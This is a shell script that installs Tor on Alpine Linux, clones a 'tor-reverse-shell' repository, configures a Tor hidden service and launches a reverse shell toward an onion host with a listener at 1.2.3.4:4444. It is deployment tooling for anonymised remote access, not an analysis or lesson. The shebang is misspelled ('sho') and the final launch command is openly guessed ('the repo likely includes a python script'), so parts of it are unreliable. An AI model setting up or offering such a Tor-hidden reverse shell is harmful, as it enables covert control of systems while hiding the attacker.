#!/usr/bin/env sho
# https://github.com/tpaphysics/tor-reverse-shell/tree/main

# Optional environment variables that can be set before running the script:
: "${TOR_TARGET_HOST:=my.onion.host}"
: "${TOR_TARGET_PORT:=8080}"
: "${LOCAL_LISTENER:=1.2.3.4:4444}"
: "${REPO_URL:=https://github.com/tpaphysics/tor-reverse-shell.git}"
: "${CLONE_DIR:=/opt/tor-reverse-shell}"
: "${HIDDEN_SERVICE_DIR:=/var/lib/tor/hidden_service}"

echo "[INFO] Updating Alpine and installing dependencies..."
apk update
apk add --no-cache \
    tor \
    python3 \
    py3-pip \
    git \
    curl \
    bash \
    coreutils \
    libc6-compat

# Ensure pip is up-to-date
pip3 install --upgrade pip

echo "[INFO] Cloning the repository..."
if [ -d "$CLONE_DIR" ]; then
    rm -rf "$CLONE_DIR"
fi
git clone "$REPO_URL" "$CLONE_DIR"
cd "$CLONE_DIR"

echo "[INFO] Installing Python dependencies..."
if [ -f requirements.txt ]; then
    pip3 install -r requirements.txt
fi

echo "[INFO] Configuring Tor hidden service..."
mkdir -p "$HIDDEN_SERVICE_DIR"
chown -R tor:tor "$HIDDEN_SERVICE_DIR"
chmod 700 "$HIDDEN_SERVICE_DIR"

# Create a basic torrc configuration. Adjust as needed.
cat <<EOF > /etc/tor/torrc
Log notice stdout
DataDirectory /var/lib/tor
HiddenServiceDir $HIDDEN_SERVICE_DIR
HiddenServicePort $TOR_TARGET_PORT 127.0.0.1:$TOR_TARGET_PORT
EOF

echo "[INFO] Starting Tor..."
# Run tor in background
tor &

# Wait a bit for Tor to start and create the hidden service
sleep 10

# Retrieve the onion hostname
if [ -f "$HIDDEN_SERVICE_DIR/hostname" ]; then
    ONION_HOSTNAME=$(cat "$HIDDEN_SERVICE_DIR/hostname")
    echo "[INFO] Tor hidden service available at: $ONION_HOSTNAME"
else
    echo "[ERROR] Tor hidden service hostname not found!"
    exit 1
fi

# Export environment for Python script if needed
export TOR_TARGET_HOST=$TOR_TARGET_HOST
export TOR_TARGET_PORT=$TOR_TARGET_PORT
export LOCAL_LISTENER=$LOCAL_LISTENER

echo "[INFO] Starting the Tor-based reverse shell..."
# The repo likely includes a python script or something similar to start the shell.
# For example: python3 reverse_shell.py --host $TOR_TARGET_HOST --port $TOR_TARGET_PORT
# Adjust the command below based on the repository’s instructions:
if [ -f "reverse_shell.py" ]; then
    exec python3 reverse_shell.py --host $TOR_TARGET_HOST --port $TOR_TARGET_PORT
else
    echo "[ERROR] reverse_shell.py not found in repository directory."
    exit 1
fi